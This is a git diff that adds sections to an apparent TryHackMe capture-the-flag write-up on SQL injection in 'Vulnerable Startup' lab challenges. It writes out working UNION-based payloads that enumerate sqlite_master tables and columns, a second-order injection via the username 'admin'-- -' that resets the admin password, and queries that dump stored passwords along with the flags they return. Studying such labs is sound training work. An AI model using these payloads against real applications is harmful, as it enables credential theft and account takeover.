@@ -288,7 +288,34 @@ Table: users
 <details>
    <summary>Vulnerable Startup: Vulnerable Notes</summary>
 
-    
+- > login not vuln but when you enter vuln username it can used when do insert in notes
+  >
+  > ``login`` with
+  >
+  > ```
+  > ' union select 1, group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%'--
+  > ```
+  >
+  > open notes you will found :
+  >
+  > ```
+  > users,notes
+  > ```
+  >
+  > so it's vuln and you now know tables names
+  >
+  > now use :
+  >
+  > ```
+  > '  union select 1,group_concat(password) from users'
+  > ```
+  >
+  > ``found``
+  >
+  > ```
+  > THM{4644c7e157fd5498e7e4026c89650814}
+  > ```
+
    
 </details>
 
@@ -296,6 +323,163 @@ Table: users
 
 
 --------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+<details>
+     <summary>Vulnerable Startup: Change Password (i like it) 💯</summary>
+
+- > create account using this name:
+  >
+  > ``admin'-- -``
+  >
+  > after login we will try to change password , reset password query is not scure this it is :
+  >
+  > ```
+  > UPDATE users SET password = ? WHERE username = 'admin'-- -'
+  > ```
+  >
+  > in this way we change passowrd of ``admin`` user
+  >
+  > after that login with new passowrd ``admin:123``
+  >
+  > and ``found``
+  >
+  > ```
+  >  THM{cd5c4f197d708fda06979f13d8081013} 
+  > ```
+  >
+  
+   
+</details>
+
+
+
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+<details>
+    <summary>Vulnerable Startup: Book Title</summary>
+
+- > function of search on books it's query is vuln:
+  >
+  > ```
+  > SELECT * FROM books WHERE id = (SELECT id FROM books WHERE title LIKE '" + title + "%')
+  > ```
+  >
+  > we will found in url the title like this
+  >
+  > ``http://10.10.216.224:5000/challenge6/book?title=test``
+  >
+  > it's query is :
+  >
+  > ```
+  > SELECT * FROM books WHERE id = (SELECT id FROM books WHERE title LIKE 'test%')
+  > ```
+  >
+  > if i write **``') OR 1=1-- -``**
+  >
+  > the query will be like
+  >
+  > ```
+  > SELECT * FROM books WHERE id = (SELECT id FROM books WHERE title LIKE '') OR 1=1-- -')
+  > ```
+  >
+  > and it will give us all books : )
+  >
+  > and now we can user UNION select to get our tables and it's data
+  >
+  > ![MuaKissGIF](https://github.com/user-attachments/assets/9eef9bc5-c0b9-4e1c-98f2-21e5e00b8d0e)
+  >
+  > after that write:
+
+  ⚠️⚠️⚠️
+<details>
+   <summary>get name of table and it's column</summary>
+
+   - > ```
+     > ') UNOIN select 1-- -
+     > ```
+     > no output untill found
+     >
+     > ```
+     > ') union select 1,2,3,4-- -
+     > ```
+     >
+     > ### now we need to know tables name
+     >
+     > ```
+     > ') UNION SELECT 1,2,3, group_concat(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%'-- -
+     > ```
+     >
+     > found
+     > **``users,notes,books``**
+     >
+     > ### ``now find colmn names``
+     >
+     > ```
+     > ') UNION SELECT 1,2,3,sql FROM sqlite_master WHERE name='users' AND type='table'-- -
+     > ```
+     >
+     > found
+     > 
+     > ```
+     > CREATE TABLE users ( id integer primary key,
+     >                      username text unique not null,
+     >                      password text not null )
+     > ```
+     >
+     > ### get passowrds
+     >
+     > ```
+     > ') union select 1,2,3,group_concat(password) from users-- -
+     > ```
+     >
+     >  ```
+     >  THM{27f8f7ce3c05ca8d6553bc5948a89210},asd,Summer2019!,345m3io4hj3,viking123,123
+     >  ```
+   
+</details>
+⚠️⚠️⚠️⚠️
+   
+   - >
+     > found that there is users tabel and column call password
+     > 
+     > ```
+     > ') union select 1,2,3,group_concat(password) from users-- -
+     > ```
+     >
+     > ```
+     > THM{27f8f7ce3c05ca8d6553bc5948a89210},asd,Summer2019!,345m3io4hj3,viking123,123
+     > ```
+     > ![MuaKissGIF](https://github.com/user-attachments/assets/9eef9bc5-c0b9-4e1c-98f2-21e5e00b8d0e)
+     > 
+    
+  
+
+  
+  
+  
+
+   
+</details>
+
+
+
+
 
 
 
